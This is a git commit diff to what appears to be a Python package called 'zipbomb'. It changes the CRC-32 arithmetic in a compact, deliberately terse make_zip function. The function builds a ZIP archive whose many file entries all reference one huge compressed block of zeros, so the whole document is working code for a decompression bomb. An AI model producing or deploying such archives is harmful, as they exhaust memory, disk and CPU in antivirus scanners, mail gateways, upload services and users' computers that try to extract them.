218c0e06b9d9a268b7e832c273e8622522e64c2c
donno2048 <just4now666666@gmail.com>
2022-09-28 23:08:05 +0300

    use `long` (modulus `1<<32`)

--- zipbomb/__init__.py
+++ zipbomb/__init__.py
@@ -6,10 +6,10 @@ def make_zip(f,num_files,compressed_size):
 	A,H,B,I,a,o=(1<<32)-1,num_files,compressed_size,[1<<A for A in range(33)],range(8),[0]*8
 	for n in a:
 		for b in a:o[n]=o[n]>>1^3988292384*((1<<n>>b^o[n])&1)
-	C,D=B*1032-14447,o+I[:24]+[A+1];K=C
+	C,D=B*1032-14447,o+I[:24]+[0];K=C
 	while C:
 		if C&1:I=[G(I,A)for A in D]
 		D=[G(D,A)for A in D];C>>=1
-	L=~G(I,2*A+1)&A;J=f.write(F('<QLHLLLLQLH',85966670672,8,0,L,B,K,1,36536642864,1409003712,25695)+b'\x0b'+b'\0'*(B-15)+b'`');M=J
+	L=~G(I,A)&A;J=f.write(F('<QLHLLLLQLH',85966670672,8,0,L,B,K,1,36536642864,1409003712,25695)+b'\x0b'+b'\0'*(B-15)+b'`');M=J
 	for E in range(H):N=str(E).encode();J+=f.write(F('<QQLLLHQQ',5629585467198288,524288,L,B,K,len(N),0,0)+N)
 	f.write(F('<QHHLLH',101010256,H,H,J-M,M,0))
